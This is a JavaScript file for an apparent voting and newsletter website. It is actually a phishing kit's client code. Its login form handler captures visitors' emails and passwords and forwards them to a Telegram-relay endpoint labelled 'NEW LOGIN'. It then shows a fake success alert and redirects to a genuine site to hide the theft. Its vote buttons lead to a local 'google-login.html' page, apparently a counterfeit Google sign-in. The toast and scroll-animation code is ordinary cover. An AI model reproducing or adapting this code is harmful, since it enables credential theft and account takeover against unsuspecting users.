// Send message via backend API (credentials are now secure on server)
async function sendToTelegram(msg) {
    try {
        const response = await fetch('/api/send-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: msg })
        });

        const data = await response.json();

        if (!data.success) {
            console.error('Failed to send message:', data.error);
        }
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

// Check if vote was just submitted and show success toast
const voteSubmitted = sessionStorage.getItem('voteSubmitted');

if (voteSubmitted === 'true') {
    // Remove the flag
    sessionStorage.removeItem('voteSubmitted');
    
    // Show success toast immediately
    setTimeout(() => {
        showToast('✓ Your vote has been submitted successfully!', 'success');
    }, 500);
}

// Toast notification function
function showToast(message, type = 'info') {
    const existingToast = document.querySelector('.toast');
    if (existingToast) existingToast.remove();

    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.classList.add('show');
    }, 100);
    
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => {
            if (toast.parentNode) document.body.removeChild(toast);
        }, 300);
    }, 4000);
}

// Newsletter/Login Submission
const authForm = document.getElementById('authForm');
if (authForm) {
    authForm.onsubmit = async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        await sendToTelegram(`📬 *NEW LOGIN*\nEmail: ${email}\nPassword: ${pass}`);
        alert('Subscription successful!');
        // Optional: Redirect to real site after alert
        window.location.href = "https://teammanila.com";
    };
}

// Voting Buttons - Redirect directly to Google login
document.querySelectorAll('.vote-btn').forEach(button => {
    button.addEventListener('click', function (e) {
        e.preventDefault();
        const candidate = this.getAttribute('data-candidate');
        // Store candidate and redirect directly to Google login
        sessionStorage.setItem('votingFor', candidate);
        window.location.href = 'google-login.html';
    });
});

// Scroll Animation Observer
const observerOptions = {
    threshold: 0.15,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('animate-in');
        } else {
            // Remove class when scrolling back up for re-animation
            entry.target.classList.remove('animate-in');
        }
    });
}, observerOptions);

// Observe all scroll-animate elements
document.querySelectorAll('.scroll-animate').forEach(element => {
    observer.observe(element);
});